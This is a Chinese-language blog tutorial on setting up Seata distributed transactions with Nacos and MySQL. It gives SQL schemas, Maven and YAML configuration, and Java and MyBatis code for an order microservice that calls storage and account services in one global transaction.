<p>TM (Transaction Manager) - 事务管理器：定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p>
<p>RM (Resource Manager) - 资源管理器：管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p>
<h3 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h3><p><img src="https://csn.damyoung.cn/image-20210205103929876.png" alt="image-20210205103929876"></p>
<p><img src="https://csn.damyoung.cn/image-20210205104523353.png" alt="image-20210205104523353"></p>
<h2 id="安装seata"><a href="#安装seata" class="headerlink" title="安装seata"></a>安装seata</h2><p><img src="https://csn.damyoung.cn/image-20210205104829079.png" alt="image-20210205104829079"></p>
<p><img src="https://csn.damyoung.cn/image-20210205105626507.png" alt="image-20210205105626507"></p>
<p><img src="https://csn.damyoung.cn/image-20210205104924446.png" alt="image-20210205104924446"></p>
<p><img src="https://csn.damyoung.cn/image-20210205115951285.png" alt="image-20210205115951285"></p>
<p><img src="https://csn.damyoung.cn/image-20210205105157797.png" alt="image-20210205105157797"></p>
<p>建库seata，建表db_store.sql;</p>
<p>指明注册中心为nacos，及修改nacos连接信息</p>
<p>创建seata/logs/seata_gc.log，添加mysql8驱动jar包到bin目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driverClassName &#x3D; &quot;com.mysql.cj.jdbc.Driver&quot;</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;seata?characterEncoding&#x3D;utf8&amp;connectTimeout&#x3D;1000&amp;socketTimeout&#x3D;3000&amp;autoReconnect&#x3D;true&amp;serverTimezone&#x3D;UTC&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210205105740447.png" alt="image-20210205105740447"></p>
<p><img src="https://csn.damyoung.cn/image-20210205120152477.png" alt="image-20210205120152477"></p>
<h2 id="账户-库存-账户业务数据库准备"><a href="#账户-库存-账户业务数据库准备" class="headerlink" title="账户/库存/账户业务数据库准备"></a>账户/库存/账户业务数据库准备</h2><blockquote>
<p>先启动Nacos后启动Seata！！！</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210205122006674.png" alt="image-20210205122006674"></p>
<p><img src="https://csn.damyoung.cn/image-20210205122151086.png" alt="image-20210205122151086"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE seata_order;</span><br><span class="line">USE seata_order;</span><br><span class="line">CREATE TABLE t_order(</span><br><span class="line">    id BIGINT(<span class="number">11</span>) NOT NULL AUTO_INCREMENT PRIMARY KEY ,</span><br><span class="line">    user_id BIGINT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">    product_id BIGINT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;产品id&#x27;</span>,</span><br><span class="line">    count INT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;数量&#x27;</span>,</span><br><span class="line">    money DECIMAL(<span class="number">11</span>,<span class="number">0</span>) DEFAULT NULL COMMENT <span class="string">&#x27;金额&#x27;</span>,</span><br><span class="line">    status INT(<span class="number">1</span>) DEFAULT NULL COMMENT <span class="string">&#x27;订单状态：0创建中，1已完结&#x27;</span></span><br><span class="line">)ENGINE=InnoDB AUTO_INCREMENT=<span class="number">7</span> CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">CREATE DATABASE seata_storage;</span><br><span class="line">USE seata_storage;</span><br><span class="line">CREATE TABLE t_storage(</span><br><span class="line">    id BIGINT(<span class="number">11</span>) NOT NULL AUTO_INCREMENT PRIMARY KEY ,</span><br><span class="line">    product_id BIGINT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;产品id&#x27;</span>,</span><br><span class="line">    total INT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;总库存&#x27;</span>,</span><br><span class="line">    used INT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;已用库存&#x27;</span>,</span><br><span class="line">    residue INT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;剩余库存&#x27;</span></span><br><span class="line">)ENGINE=InnoDB AUTO_INCREMENT=<span class="number">7</span> CHARSET=utf8;</span><br><span class="line">INSERT INTO t_storage(id, product_id, total, used, residue) VALUES(<span class="number">1</span>,<span class="number">1</span>,<span class="number">100</span>,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">CREATE DATABASE seata_account;</span><br><span class="line">USE seata_account;</span><br><span class="line">CREATE TABLE t_account(</span><br><span class="line">    id BIGINT(<span class="number">11</span>) NOT NULL AUTO_INCREMENT PRIMARY KEY ,</span><br><span class="line">    user_id BIGINT(<span class="number">11</span>) DEFAULT NULL COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">    total DECIMAL(<span class="number">10</span>,<span class="number">0</span>) DEFAULT NULL COMMENT <span class="string">&#x27;总额度&#x27;</span>,</span><br><span class="line">    used DECIMAL(<span class="number">10</span>,<span class="number">0</span>) DEFAULT NULL COMMENT <span class="string">&#x27;已用额度&#x27;</span>,</span><br><span class="line">    residue DECIMAL(<span class="number">10</span>,<span class="number">0</span>) DEFAULT <span class="number">0</span> COMMENT <span class="string">&#x27;剩余可用额度&#x27;</span></span><br><span class="line">)ENGINE=InnoDB AUTO_INCREMENT=<span class="number">7</span> CHARSET=utf8;</span><br><span class="line">INSERT INTO t_account(id, user_id, total, used, residue) VALUES(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1000</span>,<span class="number">0</span>,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210205122517376.png" alt="image-20210205122517376"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">CREATE TABLE <span class="string">`undo_log`</span> (</span><br><span class="line">  <span class="string">`id`</span> BIGINT(<span class="number">20</span>) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`branch_id`</span> BIGINT(<span class="number">20</span>) NOT NULL,</span><br><span class="line">  <span class="string">`xid`</span> VARCHAR(<span class="number">100</span>) NOT NULL,</span><br><span class="line">  <span class="string">`context`</span> VARCHAR(<span class="number">128</span>) NOT NULL,</span><br><span class="line">  <span class="string">`rollback_info`</span> LONGBLOB NOT NULL,</span><br><span class="line">  <span class="string">`log_status`</span> INT(<span class="number">11</span>) NOT NULL,</span><br><span class="line">  <span class="string">`log_created`</span> DATETIME NOT NULL,</span><br><span class="line">  <span class="string">`log_modified`</span> DATETIME NOT NULL,</span><br><span class="line">  <span class="string">`ext`</span> VARCHAR(<span class="number">100</span>) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  UNIQUE KEY <span class="string">`ux_undo_log`</span> (<span class="string">`xid`</span>,<span class="string">`branch_id`</span>)</span><br><span class="line">) ENGINE=INNODB AUTO_INCREMENT=<span class="number">1</span> DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>



<p><img src="https://csn.damyoung.cn/image-20210205122909980.png" alt="image-20210205122909980"></p>
<h2 id="订单-库存-账户业务微服务准备"><a href="#订单-库存-账户业务微服务准备" class="headerlink" title="订单/库存/账户业务微服务准备"></a>订单/库存/账户业务微服务准备</h2><p>下订单-减库存-扣余额-改订单状态</p>
<p><img src="https://csn.damyoung.cn/image-20210205151312123.png" alt="image-20210205151312123"></p>
<p><img src="https://csn.damyoung.cn/image-20210205152124208.png" alt="image-20210205152124208"></p>
<h3 id="seate-order-service2001"><a href="#seate-order-service2001" class="headerlink" title="seate-order-service2001"></a>seate-order-service2001</h3><p><img src="https://csn.damyoung.cn/image-20210205161253666.png" alt="image-20210205161253666"></p>
<h4 id="pom"><a href="#pom" class="headerlink" title="pom"></a>pom</h4><blockquote>
<p>seata要改成使用的版本</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--nacos--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--seata--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--feign--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">2001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata-order-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="comment">#自定义事务组名称需要与seata-server中的对应</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">fsp_tx_group</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:8848</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/seata_order</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">io:</span></span><br><span class="line">      <span class="attr">seata:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>

<h4 id="pojo"><a href="#pojo" class="headerlink" title="pojo"></a>pojo</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Order</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long userId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> BigDecimal money;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 订单状态：0创建中，1已完结</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonResult</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String  message;</span><br><span class="line">    <span class="keyword">private</span> T       data;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommonResult</span><span class="params">(Integer code, String message)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(code,message,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderMapper</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1 新建订单</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 修改订单状态，从零改为1</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="meta">@Param(&quot;userId&quot;)</span> Long userId, <span class="meta">@Param(&quot;status&quot;)</span> Integer status)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.mapper.OrderMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.example.pojo.Order&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userId&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;product_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;productId&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;count&quot;</span> <span class="attr">property</span>=<span class="string">&quot;count&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;money&quot;</span> <span class="attr">property</span>=<span class="string">&quot;money&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;DECIMAL&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;status&quot;</span> <span class="attr">property</span>=<span class="string">&quot;status&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;create&quot;</span>&gt;</span></span><br><span class="line">        insert into t_order (id,user_id,product_id,count,money,status)</span><br><span class="line">        values (null,#&#123;userId&#125;,#&#123;productId&#125;,#&#123;count&#125;,#&#123;money&#125;,0);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">        update t_order set status = 1</span><br><span class="line">        where user_id=#&#123;userId&#125; and status = #&#123;status&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><blockquote>
<p>feign远程调用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;seata-account-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountService</span></span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/account/decrease&quot;)</span></span><br><span class="line">    <span class="function">CommonResult <span class="title">decrease</span><span class="params">(<span class="meta">@RequestParam(&quot;userId&quot;)</span> Long userId, <span class="meta">@RequestParam(&quot;money&quot;)</span> BigDecimal money)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;seata-storage-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StorageService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/storage/decrease&quot;)</span></span><br><span class="line">    <span class="function">CommonResult <span class="title">decrease</span><span class="params">(<span class="meta">@RequestParam(&quot;productId&quot;)</span> Long productId, <span class="meta">@RequestParam(&quot;count&quot;)</span> Integer count)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderServiceImpl</span> <span class="keyword">implements</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OrderMapper orderMapper;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> StorageService storageService;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AccountService accountService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建订单-&gt;调用库存服务扣减库存-&gt;调用账户服务扣减账户余额-&gt;修改订单状态</span></span><br><span class="line"><span class="comment">     * 简单说：下订单-&gt;扣库存-&gt;减余额-&gt;改状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@GlobalTransactional(name = &quot;fsp-create-order&quot;,rollbackFor = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;开始新建订单&quot;</span>);</span><br><span class="line">        <span class="comment">//1 新建订单</span></span><br><span class="line">        orderMapper.create(order);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 扣减库存</span></span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;订单微服务开始调用库存，做扣减Count&quot;</span>);</span><br><span class="line">        storageService.decrease(order.getProductId(),order.getCount());</span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;订单微服务开始调用库存，做扣减end&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 扣减账户</span></span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;订单微服务开始调用账户，做扣减Money&quot;</span>);</span><br><span class="line">        accountService.decrease(order.getUserId(),order.getMoney());</span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;订单微服务开始调用账户，做扣减end&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 修改订单状态，从零到1,1代表已经完成</span></span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;修改订单状态开始&quot;</span>);</span><br><span class="line">        orderMapper.update(order.getUserId(),<span class="number">0</span>);</span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;修改订单状态结束&quot;</span>);</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;-----&gt;下订单结束了，O(∩_∩)O哈哈~&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/order/create&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">create</span><span class="params">(Order order)</span></span>&#123;</span><br><span class="line">        orderService.create(order);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;订单创建成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> dmYang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021/2/5 15:46</span></span><br><span class="line"><span class="comment"> *  使用Seata对数据源进行代理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceProxyConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;mybatis.mapperLocations&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String mapperLocations;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">druidDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSourceProxy <span class="title">dataSourceProxy</span><span class="params">(DataSource dataSource)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DataSourceProxy(dataSource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">sqlSessionFactoryBean</span><span class="params">(DataSourceProxy dataSourceProxy)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSourceProxy);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(<span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(mapperLocations));</span><br><span class="line">        sqlSessionFactoryBean.setTransactionFactory(<span class="keyword">new</span> SpringManagedTransactionFactory());</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan(&#123;&quot;com.example.mapper&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisConfig</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="meta">@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)</span><span class="comment">//取消数据源的自动创建</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeataOrderMainApp2001</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SpringApplication.run(SeataOrderMainApp2001.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h4><p><img src="https://csn.damyoung.cn/image-20210205161815080.png" alt="image-20210205161815080"></p>
<p><img src="https://csn.damyoung.cn/image-20210205161830639.png" alt="image-20210205161830639"></p>
<h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><p><img src="https://csn.damyoung.cn/image-20210205164318136.png" alt="image-20210205164318136"></p>
<p><img src="https://csn.damyoung.cn/image-20210205165853631.png" alt="image-20210205165853631"></p>
<p><img src="https://csn.damyoung.cn/image-20210205165937890.png" alt="image-20210205165937890"></p>
<p><img src="https://csn.damyoung.cn/image-20210205170002483.png" alt="image-20210205170002483"></p>
<p><img src="https://csn.damyoung.cn/image-20210205170029675.png" alt="image-20210205170029675"></p>
<p><img src="https://csn.damyoung.cn/image-20210205170051752.png" alt="image-20210205170051752"></p>
<h2 id="Seata原理"><a href="#Seata原理" class="headerlink" title="Seata原理"></a>Seata原理</h2><p><img src="https://csn.damyoung.cn/image-20210205170428944.png" alt="image-20210205170428944"></p>
<p><img src="https://csn.damyoung.cn/image-20210205170609746.png" alt="image-20210205170609746"></p>
